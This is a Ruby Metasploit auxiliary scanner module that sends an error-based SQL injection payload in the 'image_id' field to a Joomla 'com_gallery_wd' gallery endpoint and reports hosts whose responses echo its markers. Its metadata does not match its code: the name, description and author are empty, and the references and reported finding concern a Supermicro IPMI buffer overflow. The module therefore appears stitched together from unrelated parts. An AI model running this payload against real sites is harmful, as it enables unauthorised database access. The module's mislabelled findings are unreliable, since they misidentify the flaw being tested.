##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'uri'
require 'msf/core'

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => '',
      'Description' => %q{
      },
      'Author'       =>
        [
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'CVE', '2013-3621' ],
          [ 'CVE', '2013-3623' ],
          [ 'URL', 'https://community.rapid7.com/community/metasploit/blog/2013/11/06/supermicro-ipmi-firmware-vulnerabilities']
        ],
      'DisclosureDate' => 'Nov 06 2013'))

  end

  def run_host(ip)

    left_marker = Rex::Text.rand_text_alpha(5)
    right_marker = Rex::Text.rand_text_alpha(5)
    flag = Rex::Text.rand_text_alpha(5)

    vprint_status("#{peer} - Checking host")

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'method' => 'POST',
      'vars_get' => {
        'option' => 'com_gallery_wd',
        'view' => 'gallerybox',
        'image_id' => '-1',
        'gallery_id' => '-1',
        'thumb_width' => '180',
        'thumb_height' => '90',
        'open_with_fullscreen' => 0,
        'image_width' => 800,
        'image_height' => 500,
        'image_effect' => 'fade',
        'sort_by' => 'order',
        'order_by' => 'asc',
        'enable_image_filmstrip' => '',
        'image_filmstrip_height' => 0,
        'enable_image_ctrl_btn' => 1,
        'enable_image_fullscreen' => 1,
        'popup_enable_info' => 1,
        'popup_info_always_show' => 0,
        'popup_hit_counter' => 0,
        'popup_enable_rate' => 0,
        'slideshow_interval' => 5,
        'enable_comment_social' => '',
        'enable_image_facebook' => '',
        'enable_image_twitter' => '',
        'enable_image_google' => '',
        'enable_image_pinterest' => '',
        'enable_image_tumblr' => '',
        'watermark_type' => 'none'
      },
      'vars_post' => {
        'image_id' => "1 AND (SELECT 2425 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},0x#{flag.unpack("H*")[0]},0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)",
        'rate' => '',
        'ajax_task' => 'save_hit_count',
        'task' => 'gallerybox.ajax_search'
      }
    })

    unless res && res.body
      vprint_error("#{peer} - Server did not respond in an expected way")
      return
    end

    result = res.body =~ /#{left_marker}#{flag}#{right_marker}/

    if result
      print_good("#{peer} - Vulnerable to CVE-2013-3623 (close_window.cgi Buffer Overflow)")
      report_vuln({
        :host  => rhost,
        :port  => rport,
        :proto => 'tcp',
        :name  => "Supermicro Onboard IPMI close_window.cgi Buffer Overflow",
        :refs  => self.references.select { |ref| ref.ctx_val == "2013-3623" }
      })
    end

  end

end
